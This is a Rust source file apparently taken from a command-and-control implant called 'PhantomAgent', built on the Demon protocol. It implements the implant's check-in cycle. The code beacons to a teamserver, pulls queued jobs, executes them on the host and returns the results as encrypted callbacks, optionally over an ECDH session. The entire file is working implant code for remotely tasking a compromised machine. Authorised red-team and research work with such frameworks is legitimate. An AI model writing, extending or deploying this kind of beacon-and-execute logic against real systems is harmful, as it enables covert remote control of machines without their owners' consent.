//! Pending callback queue management and checkin dispatch.

use red_cell_common::demon::{DemonCommand, DemonMessage, DemonPackage};

use super::PhantomAgent;
use crate::command::{PendingCallback, execute};
use crate::ecdh::send_session_packet;
use crate::error::PhantomError;
use crate::protocol::{build_callback_packet, callback_ctr_blocks};

impl PhantomAgent {
    /// Send a `COMMAND_CHECKIN` heartbeat, then fetch and dispatch queued tasks
    /// with a separate `COMMAND_GET_JOB` request.
    ///
    /// When an ECDH session is active, this sends a single combined session packet
    /// containing both `CommandCheckin` and `CommandGetJob`, then routes any pending
    /// callbacks as individual ECDH session packets (one per callback).
    ///
    /// Without ECDH, mirrors Specter's two-request pattern: the teamserver's
    /// `handle_checkin` returns no task bytes, so tasks must be fetched via a
    /// follow-up `CommandGetJob` call.
    pub async fn checkin(&mut self) -> Result<bool, PhantomError> {
        self.state.poll().await?;

        if self.ecdh_session.is_some() {
            return self.ecdh_checkin().await;
        }

        self.flush_pending_callbacks().await?;

        // Send COMMAND_CHECKIN heartbeat; the server always returns an empty body.
        let packet = build_callback_packet(
            self.agent_id,
            &self.session_crypto,
            self.ctr_offset,
            self.callback_seq,
            u32::from(DemonCommand::CommandCheckin),
            0,
            &[],
        )?;
        let _response = self.transport.send(&packet).await?;
        self.ctr_offset += callback_ctr_blocks(0);
        self.callback_seq += 1;

        // Fetch queued tasks with a separate COMMAND_GET_JOB request.
        let packages = self.get_job().await?;

        let mut exit_requested = false;
        for package in packages {
            execute(&package, &mut self.config, &mut self.state).await?;
            for callback in self.state.drain_callbacks() {
                let payload = callback.payload()?;
                let packet = build_callback_packet(
                    self.agent_id,
                    &self.session_crypto,
                    self.ctr_offset,
                    self.callback_seq,
                    callback.command_id(),
                    callback.request_id(),
                    &payload,
                )?;
                self.send_packet(packet).await?;
                self.ctr_offset += callback_ctr_blocks(payload.len());
                self.callback_seq += 1;
                if matches!(callback, PendingCallback::Exit { .. }) {
                    exit_requested = true;
                }
            }
        }

        Ok(exit_requested)
    }

    /// ECDH-mode checkin: combines checkin + get_job into one encrypted session packet.
    async fn ecdh_checkin(&mut self) -> Result<bool, PhantomError> {
        // First flush any pending callbacks as individual ECDH session packets.
        self.ecdh_flush_pending_callbacks().await?;

        // Send [CommandCheckin, CommandGetJob] in one session packet.
        let packages = vec![
            DemonPackage::new(DemonCommand::CommandCheckin, 0, Vec::new()),
            DemonPackage::new(DemonCommand::CommandGetJob, 0, Vec::new()),
        ];
        let response = self.ecdh_send_packages(packages).await?;

        // Response is DemonMessage bytes containing job packages (if any).
        if response.is_empty() {
            return Ok(false);
        }
        let job_message = DemonMessage::from_bytes(&response)
            .map_err(|e| PhantomError::Transport(format!("ECDH job parse: {e}")))?;

        let mut exit_requested = false;
        for package in job_message.packages {
            execute(&package, &mut self.config, &mut self.state).await?;
            for callback in self.state.drain_callbacks() {
                let payload = callback.payload()?;
                let callback_pkg = DemonPackage {
                    command_id: callback.command_id(),
                    request_id: callback.request_id(),
                    payload,
                };
                let resp = self.ecdh_send_packages(vec![callback_pkg]).await?;
                let _ = resp; // server response to a callback is informational only
                if matches!(callback, PendingCallback::Exit { .. }) {
                    exit_requested = true;
                }
            }
        }

        Ok(exit_requested)
    }

    /// Flush pending callbacks over ECDH (one session packet per callback).
    async fn ecdh_flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
        for callback in self.state.drain_callbacks() {
            let payload = callback.payload()?;
            let pkg = DemonPackage {
                command_id: callback.command_id(),
                request_id: callback.request_id(),
                payload,
            };
            let _resp = self.ecdh_send_packages(vec![pkg]).await?;
        }
        Ok(())
    }

    pub(super) async fn flush_pending_callbacks(&mut self) -> Result<(), PhantomError> {
        if self.ecdh_session.is_some() {
            return self.ecdh_flush_pending_callbacks().await;
        }
        for callback in self.state.drain_callbacks() {
            let payload = callback.payload()?;
            let packet = build_callback_packet(
                self.agent_id,
                &self.session_crypto,
                self.ctr_offset,
                self.callback_seq,
                callback.command_id(),
                callback.request_id(),
                &payload,
            )?;
            self.send_packet(packet).await?;
            self.ctr_offset += callback_ctr_blocks(payload.len());
            self.callback_seq += 1;
        }

        Ok(())
    }
}
